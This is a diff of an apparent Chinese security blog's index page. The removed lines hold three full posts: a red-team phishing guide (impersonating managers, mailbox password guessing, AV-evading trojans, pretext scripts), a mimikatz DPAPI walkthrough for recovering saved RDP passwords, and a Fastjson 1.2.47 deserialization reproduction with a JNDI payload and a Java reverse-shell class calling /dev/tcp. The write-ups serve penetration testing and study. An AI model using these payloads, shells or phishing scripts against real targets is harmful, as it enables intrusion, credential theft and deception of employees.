+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            六月 24, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/06/24/钓鱼小结/" title="钓鱼小结" class="posttitle">钓鱼小结</a></h3>
+        
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        2.9k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        3 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/钓鱼/">钓鱼</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p>攻防演练中，有的时候我们很难产出大量的Web漏洞达到我们想要的效果，这个时候若目标企业员工安全意识薄弱，钓鱼是个非常好的选择。</p>
+<p></p>
+<ul>
 <li>QQ(群)钓鱼</li>
 <li>微信(群)钓鱼</li>
 <li>在线客服钓鱼</li>
@@ -812,1535 +260,574 @@
 <li>内部通信工具钓鱼(企业微信、内部邮箱、飞秋、自研通讯工具等)</li>
 </ul>
 <p>只要是能和目标员工交流的地方，都可以是我们选择的突破口</p>
-<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>前期的准备是为了让我们有充足的时间去思考会发生的各种问题，针对性的制作免杀木马、制定钓鱼计划、选择钓鱼对象等，这里我分了以下需要注意的点。</p>
-<ul>
-<li><p>调研内部安全设备部署情况<br>内部员工使用的聊天工具、电脑防护软件、服务器防护设备、是否使用云桌面、是否部署EDR、流量监测等安全设备…</p>
-</li>
-<li><p>整理内部组织架构、部门领导相关信息<br>冒充领导去给员工发送信息，中招率会很高，问题是如何拿到呢？前期我们可以通过github、社工库看下有没有邮箱的账号密码泄露，用pop/smtp去爆破邮箱弱口令(Web端爆破可能会触发告警)，想尽一切办法搞到一个邮箱，登陆邮箱之后组织架构、姓名、联系方式就非常清楚了。要是不知道邮箱账号，可以Chinese Top 1000 User Name跑一波，每个公司总会有zhangwei/liwei/zhangjie这样的员工吧。</p>
-</li>
-<li><p>社交账号伪装公司员工<br>常见的就是QQ/Wechat，修改姓名、头像、个人说明为相关公司的员工信息、QQ照片墙改成名片，找到一个员工，他是怎么写的，你可以改成一模一样的，这样方便加群，沟通让对方放松警惕，之前社交账号改成了一个公司的经理，居然会有同事会主动加好友和你聊天的。也可以伪装成好看的妹纸:)</p>
-</li>
-<li><p>提前潜伏目标企业内部群<br>很多公司都会开放对外的客服群、售后群、活动群甚至内部员工群、公司群，我们通过QQ或者其他社交软件多多少少都是可以搜索到的，伪装成员工、想办法进一个，只要群里有目标公司的员工，那么就是演练时的一个突破口。最好提前一段时间(一个月)潜伏在群里，攻防演练的时候很有可能意识会很强，不会随意让加群。<br><img src="/2020/06/24/钓鱼小结/QQ群.png" alt></p>
-</li>
-<li><p>免杀马<br>若是能调研出内部防护设备(如360、symantec)，我们就可以针对性的制作免杀马，只要不报毒就ok了。一旦被发现邮件或者你发送的文件有毒，可能会引起对方的警觉，说不定通知到上级，全公司通报一下不要点恶意程序、防范钓鱼攻击，哦豁，后面就真的没人点了(实战中确实遇到过这种情况)。</p>
-</li>
-<li><p>钓鱼邮件<br>邮服搭建网上有很多相关的开源脚本，可以github一波，准备一个伪装的域名，比方说com/com.cn/co结尾的域名都是ok的，像xyz/top/me这样结尾的域名真的很容易被人认出来。而且很多时候我们发送的邮件由于网关的垃圾处理机制会拒收或者放在垃圾箱里，也不知道真实情况是啥，为了避免拒收或者发送失败可以搞一个ssl证书。还有就是邮件正文，最好能够知道内部常用的术语、称呼、签名格式，针对性的去写邮件的标题和正文，当你添加木马附件的时候，最好加个解压密码。<br>这里推荐两个邮服搭建的网站：<br><a href="https://www.iredmail.com/" target="_blank" rel="noopener">https://www.iredmail.com/</a><br><a href="http://www.ewomail.com/" target="_blank" rel="noopener">http://www.ewomail.com/</a></p>
-</li>
-</ul>
-<p>上面啰嗦了一堆，你也可以直接看下面的导图：<br><img src="/2020/06/24/钓鱼小结/钓鱼准备.png" alt></p>
-<h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><p>钓鱼的最终目的就是为了让对方点击我们精心构造好的木马（前期应做好相应的准备），毕竟我们还是和人打交道，可以和对方玩心理战。这里举几个例子：</p>
-<ul>
-<li><p>伪装客户诱导客服<br>你们的xxx系统/app无法登陆，我发个截图给你们看吧！<br>请你们配合我的工作！不要耽误我的时间！</p>
-</li>
-<li><p>伪装运维人员诱导员工<br>你好，我是(信息)安全/管理部门的xxx，后台监测到您的电脑触发了告警，请使用我们提供的工具进行清理。<br>你好，我们后台监控到您的vpn存在异常，请提供账号密码（验证码）！情况紧急！</p>
-</li>
-</ul>
-<ul>
-<li><p>伪装上级诱导下属员工<br>我给你发了个表格，尽快帮我整理好，等会开会需要。</p>
-</li>
-<li><p>伪装钓鱼邮件被发现，进行回击<br>再发一封邮件：《关于近期收到钓鱼邮件应对措施》<br>由于近期钓鱼事件频发，为了避免公司内部网络木马感染，请运行公司下发的清理程序。<br>后台会实时监控您是否运行了程序，纳入绩效考核！请立即运行程序清理！</p>
-</li>
-</ul>
-<p>多尝试几个人，一个客服不行换一个客服，一个员工不点再多换几个，大胆的尝试，问题不大。</p>
-<h1 id="后期整理"><a href="#后期整理" class="headerlink" title="后期整理"></a>后期整理</h1><p>后期需要对钓鱼的人员、获取的信息、木马的名称、邮箱的附件进行统计，方便后续的复盘以及清理。</p>
-<p>复盘的时候总结出现的问题，避免下次犯同样的错误。</p>
-<p>文章写得比较随意，基本上想到哪里就写到哪里，我们在实际钓鱼的过程当中依然可能会出现各种各样奇妙的问题，比方说员工电脑不出网、木马掉线、钓鱼邮件发送拦截等等等等，这个时候发挥聪明的小脑袋，有什么好的思路就去尝试吧~</p>
-<p>实践是检验真理的唯一标准。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/06/24/DPAPI学习记录/" class="post-title-link" itemprop="url">DPAPI学习记录</a>
-              
+<p>前期的准备是为了让我们有充足的时...</p>
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-06-24 16:14:28" itemprop="dateCreated datePublished" datetime="2020-06-24T16:14:28+08:00">2020-06-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2020-06-29 11:28:55" itemprop="dateModified" datetime="2020-06-29T11:28:55+08:00">2020-06-29</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <span class="read-more"><a href="/2020/06/24/钓鱼小结/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
-      </header>
-    
+    </div>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
 
-      
-      
-
-      
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            六月 24, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/06/24/DPAPI学习记录/" title="DPAPI学习记录" class="posttitle">DPAPI学习记录</a></h3>
         
-          
-            <h1 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h1><p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p>
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        13k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        12 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p>
 <p>应用范围：</p>
 <ul>
 <li>IE、Chrome的登录表单自动完成</li>
 <li>Powershell加密函数</li>
 <li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li>
-<li>FTP管理账户密码</li>
-<li>共享资源文件夹的访问密码</li>
-<li>无线网络帐户密钥和密码</li>
-<li>远程桌面身份凭证</li>
-</ul>
-<h1 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h1><p>位置：<strong>%APPDATA%/Microsoft/Protect/%SID%</strong><br>这里我的虚拟机中的masterkeyfile name为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">a94e3c00-08e5-4272-8648-f7a796159916</span><br></pre></td></tr></table></figure></p>
-<p>由于该文件为受保护的，所以我们要勾选掉 <strong>隐藏受保护的操作系统文件</strong></p>
-<p><img src="/2020/06/24/DPAPI学习记录/file.png" alt></p>
-<p>master key file为二进制文件，可以获取文件中的Masterkey破解登陆密码，包含以下五个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Header and system information</span><br><span class="line">User’s Master Key</span><br><span class="line">Local backup encryption key</span><br><span class="line">Unique CREDHIST file identifier</span><br><span class="line">Domain Master Key backup</span><br></pre></td></tr></table></figure></p>
-<p>利用mimikatz对MasterKeyFile进行解析，这里只是解析格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\swag7\AppData\Roaming\Microsoft\Protect\S-1-5-21-3716468413-4174316740-3893867168-1001\88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;88536919-3ca5-4e31-a0ac-1ccf6eb94dda&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 824e5853fe8cc89a609ea3d6fdf63b49</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : b1509914bf8fafaf32f0686555097ad5f6241061f2857972710a788b3c4dcce9733d7ae5fd45b7c3483a07321e6c0fb047cb06389b0567b6964c7382255d25c1a316a75c6839d7a516540a10c49941b02e3b7d08bcbca8c6ed4362469b9eafbbecca62ac20a03aa9ae739e23d67f2446a77b63b00166c2616ac31de9b59327afa6975f440bb735a95427413c1a209036</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : b9eba682e6a10a6eabe2a671f2a5f970</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 07f73eaad338c8f205525bcd76883a9280e646b79fd93fef9b162aaeea97241a03dc6aa5b9f64734d20ad78b6f6d9d4c8aa79a8d03155116c61e5e514e5ed570847f81a2ca904085672de962c687614e72dc9cd62a5c5f2ac89e1643bf3b9612218a4bbe8bfe22304389f6fa155a9790</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;bc99ef8c-8b47-4d3c-a316-2daba229d091&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3716468413-4174316740-3893867168-1001</span><br></pre></td></tr></table></figure></p>
-<h1 id="破解rdp密码"><a href="#破解rdp密码" class="headerlink" title="破解rdp密码"></a>破解rdp密码</h1><p>首先查看保存的rdp凭据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /line</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/24/DPAPI学习记录/cmdkey.png" alt></p>
-<p>windows保存rdp凭据的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></figure></p>
-<p>我们可以查看该目录下的文件有啥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 EA04-9FD7</span><br><span class="line"></span><br><span class="line"> C:\Users\swag7\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line"></span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          .</span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          ..</span><br><span class="line">2020/06/29  11:04               434 0584A81C75E5FE36C40B464C8CFBCD0F</span><br><span class="line">               1 个文件            434 字节</span><br><span class="line">               2 个目录 38,597,902,336 可用字节</span><br></pre></td></tr></table></figure></p>
-<p>用管理员权限打开mimikatz，先提个权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure></p>
-<p>解析rdp凭证文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/24/DPAPI学习记录/cred.png" alt></p>
-<p>获取到guidMasterKey，这里的gmk其实就是我们的master key file名称，位置就在<strong>%APPDATA%/Microsoft/Protect/%SID%</strong>下</p>
-<p>其实这里可以直接用mimikatz读取所有masterkeyfile对应的masterkey，使用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/24/DPAPI学习记录/sekurlsa.png" alt><br>这里其实mimikatz已经将masterkey放入缓存中，下次我们读取cred文件的时候mimikatz会直接利用masterkey进行解密。</p>
-<p>我们再运行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p>
-<p>结果如下，成功读取远程密码：<br><img src="/2020/06/24/DPAPI学习记录/08067.png" alt></p>
-<p>查看dpapi缓存：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cache</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/24/DPAPI学习记录/cache.png" alt></p>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p>
-<p><a href="https://xz.aliyun.com/t/6508" title="通过Dpapi获取Windows身份凭证" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX" title="获取已控机器本地保存的RDP密码" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-反序列化漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/" class="post-title-link" itemprop="url">Fastjson<=1.2.47 反序列化漏洞< a>
-              
+<li>FTP...</li></ul>
             
-          </=1.2.47></a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-06-22 18:01:18 / 修改时间：18:25:28" itemprop="dateCreated datePublished" datetime="2020-06-22T18:01:18+08:00">2020-06-22</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <span class="read-more"><a href="/2020/06/24/DPAPI学习记录/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
-      </header>
-    
+    </div>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
 
-      
-      
-
-      
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            六月 22, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/" title="Fastjson<=1.2.47 反序列化漏洞" class="posttitle">Fastjson<=1.2.47 反序列化漏洞</a></h3>
         
-          
-            <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        6.9k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        6 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <ul>
 <li>fastjson-1.2.47</li>
 <li>jdk-8u181-linux-x64.tar.gz</li>
 <li>marshalsec-0.0.3-SNAPSHOT-all.jar</li>
 <li>tomcat8.35</li>
 </ul>
 <p>可以用P神的vulhub和docker搭建，这里我尝试搭建了好久报错，就还是自己手工搭建吧。</p>
-<p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dajian.png" alt><br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/test.png" alt></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们可以利用DNSLOG进行漏洞探测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://q0qdv.l.dnslog.io/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dnslog.png" alt></p>
-<p>但是好像只能打一次，过一会就不能打了。</p>
-<p>接下来我们反弹shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx.xxx.xxx.xxx/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>将以上代码保存为Exploit.java，然后javac编译成class，编译好之后上传服务器，在该目录下启用python http服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7000</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/7000.png" alt></p>
-<p>开启nc监听，上面的代码中监听的12345：<br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/nc.png" alt></p>
